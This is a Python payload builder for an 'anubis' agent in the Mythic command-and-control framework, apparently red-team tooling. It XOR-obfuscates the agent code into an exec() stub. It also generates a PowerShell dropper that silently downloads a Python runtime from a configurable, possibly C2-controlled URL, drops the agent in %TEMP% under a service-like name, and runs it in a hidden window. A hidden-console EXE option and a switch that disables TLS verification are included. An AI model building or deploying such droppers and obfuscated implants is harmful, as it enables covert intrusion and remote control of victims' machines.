from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import asyncio, pathlib, os, tempfile, base64, hashlib, json, subprocess, shutil

from itertools import cycle

class anubis(PayloadType):

    name = "anubis"
    file_extension = "py"
    author = "anubis"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = ["pickle_wrapper"]
    mythic_encrypts = True
    note = "This payload uses Python to create a simple agent"
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Output format:\n"
                "  py      — Python script (.py)\n"
                "  base64  — Base64-encoded script blob\n"
                "  ps1     — PowerShell dropper: downloads Python Embeddable + runs agent (no Python install required)\n"
                "  exe     — Standalone EXE via PyInstaller (requires PyInstaller on Mythic server)"
            ),
            choices=["py", "base64", "ps1", "exe"],
            default_value="py"
        ),
        BuildParameter(
            name="python_version",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose Python version",
            choices=["Python 3.8", "Python 2.7"],
            default_value="Python 3.8"
        ),
        BuildParameter(
            name="use_non_default_cryptography_lib",
            parameter_type=BuildParameterType.ChooseOne,
            description="Use non-default 'cryptography' Python library for comms (if not, manual crypto will be used)",
            choices=["No", "Yes"],
            default_value="No"
        ),
        BuildParameter(
            name="obfuscate_script",
            parameter_type=BuildParameterType.ChooseOne,
            description="XOR and Base64-encode agent code (applied before ps1/exe wrapping)",
            choices=["Yes", "No"],
            default_value="Yes"
        ),
        BuildParameter(
            name="https_check",
            parameter_type=BuildParameterType.ChooseOne,
            description="Verify HTTPS certificate (if HTTP, leave yes)",
            choices=["Yes", "No"],
            default_value="Yes"
        ),
        BuildParameter(
            name="python_embed_url",
            parameter_type=BuildParameterType.String,
            description=(
                "[PS1 mode only] URL to download Python 3.8 Embeddable zip. "
                "Leave empty to use python.org. "
                "Set to an internal/C2-controlled URL to avoid outbound traffic to python.org."
            ),
            default_value="",
            required=False,
        ),
    ]
    c2_profiles = ["http"]

    agent_path = pathlib.Path(".") / "anubis" / "mythic"
    agent_icon_path = agent_path / "anubis.svg"
    agent_code_path = pathlib.Path(".") / "anubis" / "agent_code"

    build_steps = [
        BuildStep(step_name="Gathering Files",    step_description="Creating script payload"),
        BuildStep(step_name="Obfuscating Script", step_description="Encoding and encrypting script content"),
        BuildStep(step_name="Packaging Output",   step_description="Building final output format"),
    ]

    translation_container = None

    def getPythonVersionFile(self, directory, file):
        pyv = self.get_parameter("python_version")
        filename = ""
        if os.path.exists(os.path.join(directory, "{}.py".format(file))):
            filename = os.path.join(directory, "{}.py".format(file))
        elif pyv == "Python 2.7":
            filename = os.path.join(directory, "{}.py2".format(file))
        elif pyv == "Python 3.8":
            filename = os.path.join(directory, "{}.py3".format(file))

        if not os.path.exists(filename) or not filename:
            return ""
        else:
            return filename

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        build_msg = ""
        try:
            # ── Step 1: Gather and assemble agent code ────────────────────────
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = self.getPythonVersionFile(self.agent_code_path, cmd)
                if not command_path:
                    build_msg += "{} command not available for {}.\n".format(
                        cmd, self.get_parameter("python_version"))
                else:
                    command_code += open(command_path, "r").read() + "\n"

            base_code = open(
                self.getPythonVersionFile(
                    os.path.join(self.agent_code_path, "base_agent"), "base_agent"), "r"
            ).read()

            if self.get_parameter("use_non_default_cryptography_lib") == "Yes":
                crypto_code = open(self.getPythonVersionFile(
                    os.path.join(self.agent_code_path, "base_agent"), "crypto_lib"), "r").read()
            else:
                crypto_code = open(self.getPythonVersionFile(
                    os.path.join(self.agent_code_path, "base_agent"), "manual_crypto"), "r").read()

            base_code = base_code.replace("CRYPTO_HERE", crypto_code)
            base_code = base_code.replace("UUID_HERE",   self.uuid)
            base_code = base_code.replace("#COMMANDS_HERE", command_code)

            for c2 in self.c2info:
                for key, val in c2.get_parameters_dict().items():
                    if not isinstance(val, str):
                        base_code = base_code.replace(key,
                            json.dumps(val)
                                .replace("false", "False")
                                .replace("true",  "True")
                                .replace("null",  "None"))
                    else:
                        base_code = base_code.replace(key, val)

            if self.get_parameter("https_check") == "No":
                base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                base_code = base_code.replace("#CERTSKIP",
                    "\n        gcontext = ssl.create_default_context()\n"
                    "        gcontext.check_hostname = False\n"
                    "        gcontext.verify_mode = ssl.CERT_NONE\n")
            else:
                base_code = base_code.replace("#CERTSKIP", "")

            if build_msg:
                resp.build_stderr = build_msg
                resp.set_status(BuildStatus.Error)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))

            # ── Step 2: Obfuscation ───────────────────────────────────────────
            if self.get_parameter("obfuscate_script") == "Yes":
                key = hashlib.md5(os.urandom(128)).hexdigest().encode()
                encrypted_content = ''.join(
                    chr(c ^ k) for c, k in zip(base_code.encode(), cycle(key))
                ).encode()
                b64_enc_content = base64.b64encode(encrypted_content)
                xor_func = ("chr(c^k)" if self.get_parameter("python_version") == "Python 3.8"
                             else "chr(ord(c)^ord(k))")
                base_code = "import base64, itertools\nexec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encode())\n".format(
                    xor_func, b64_enc_content, key)

                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Obfuscating Script",
                    StepStdout="Script successfully obfuscated.",
                    StepSuccess=True
                ))
            else:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Obfuscating Script",
                    StepStdout="Obfuscation not requested, skipping.",
                    StepSuccess=True
                ))

            # ── Step 3: Package output ────────────────────────────────────────
            output_format = self.get_parameter("output")

            # ── py ────────────────────────────────────────────────────────────
            if output_format == "py":
                resp.payload = base_code.encode()
                resp.build_message = "Successfully built (.py)"

            # ── base64 ────────────────────────────────────────────────────────
            elif output_format == "base64":
                resp.payload = base64.b64encode(base_code.encode())
                resp.build_message = "Successfully built (base64)"

            # ── ps1: PowerShell dropper + Python Embeddable bootstrap ─────────
            elif output_format == "ps1":
                embed_url = (self.get_parameter("python_embed_url") or "").strip()
                if not embed_url:
                    embed_url = "https://www.python.org/ftp/python/3.8.10/python-3.8.10-embed-amd64.zip"

                # randomise temp names using first 8 chars of UUID
                uid8  = self.uuid.replace("-", "")[:8]
                agent_b64 = base64.b64encode(base_code.encode()).decode()

                ps1 = r"""$ErrorActionPreference = "SilentlyContinue"
$_t  = $env:TEMP
$_pd = Join-Path $_t "svc{uid8}"
$_pe = Join-Path $_pd "python.exe"
$_ag = Join-Path $_t "{uid8}.py"

if (-not (Test-Path $_pe)) {{
    $_zp = Join-Path $_t "{uid8}.zip"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object System.Net.WebClient).DownloadFile("{embed_url}", $_zp)
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [IO.Compression.ZipFile]::ExtractToDirectory($_zp, $_pd)
    Remove-Item $_zp -Force -ErrorAction SilentlyContinue
}}

$_b = "{agent_b64}"
[IO.File]::WriteAllText($_ag, [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_b)))

$_si = New-Object System.Diagnostics.ProcessStartInfo
$_si.FileName               = $_pe
$_si.Arguments              = "`"$_ag`""
$_si.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden
$_si.UseShellExecute        = $false
$_si.CreateNoWindow         = $true
[System.Diagnostics.Process]::Start($_si) | Out-Null
""".format(uid8=uid8, embed_url=embed_url, agent_b64=agent_b64)

                resp.payload = ps1.encode()
                resp.build_message = (
                    "Successfully built (.ps1 dropper).\n"
                    "Rename the downloaded file to .ps1 before delivery.\n"
                    "Python Embeddable source: {}\n"
                    "Temp folder on target   : %TEMP%\\svc{}"
                ).format(embed_url, uid8)

            # ── exe: standalone via PyInstaller ───────────────────────────────
            elif output_format == "exe":
                pyinstaller_bin = shutil.which("pyinstaller")
                if not pyinstaller_bin:
                    resp.set_status(BuildStatus.Error)
                    resp.build_stderr = (
                        "pyinstaller not found on Mythic server.\n"
                        "Install: pip install pyinstaller\n"
                        "Note: must run on Windows (or Linux+Wine) to produce a Windows EXE."
                    )
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Packaging Output",
                        StepStdout="PyInstaller not found.",
                        StepSuccess=False
                    ))
                    return resp

                with tempfile.TemporaryDirectory() as tmpdir:
                    script_path = os.path.join(tmpdir, "agent.py")
                    dist_path   = os.path.join(tmpdir, "dist")
                    work_path   = os.path.join(tmpdir, "build")
                    spec_path   = os.path.join(tmpdir, "agent.spec")

                    with open(script_path, "w") as f:
                        f.write(base_code)

                    result = subprocess.run(
                        [
                            pyinstaller_bin,
                            "--onefile",
                            "--noconsole",
                            "--distpath", dist_path,
                            "--workpath", work_path,
                            "--specpath", tmpdir,
                            "--name", "agent",
                            "--clean",
                            script_path,
                        ],
                        capture_output=True,
                        timeout=300,
                    )

                    exe_path = os.path.join(dist_path, "agent.exe")
                    if not os.path.exists(exe_path):
                        # Linux PyInstaller produces no extension
                        exe_path_noext = os.path.join(dist_path, "agent")
                        if os.path.exists(exe_path_noext):
                            exe_path = exe_path_noext

                    if os.path.exists(exe_path):
                        with open(exe_path, "rb") as f:
                            resp.payload = f.read()
                        size_mb = len(resp.payload) / 1024 / 1024
                        resp.build_message = "EXE built via PyInstaller ({:.1f} MB)".format(size_mb)
                    else:
                        resp.set_status(BuildStatus.Error)
                        resp.build_stderr = (
                            "PyInstaller completed but EXE not found.\n"
                            "stdout: {}\nstderr: {}".format(
                                result.stdout.decode(errors='replace')[-2000:],
                                result.stderr.decode(errors='replace')[-2000:],
                            )
                        )
                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Packaging Output",
                            StepStdout="PyInstaller build failed.",
                            StepSuccess=False
                        ))
                        return resp

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Packaging Output",
                StepStdout="Output format '{}' built successfully.".format(output_format),
                StepSuccess=True
            ))

        except subprocess.TimeoutExpired:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "PyInstaller timed out (>300s)"
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
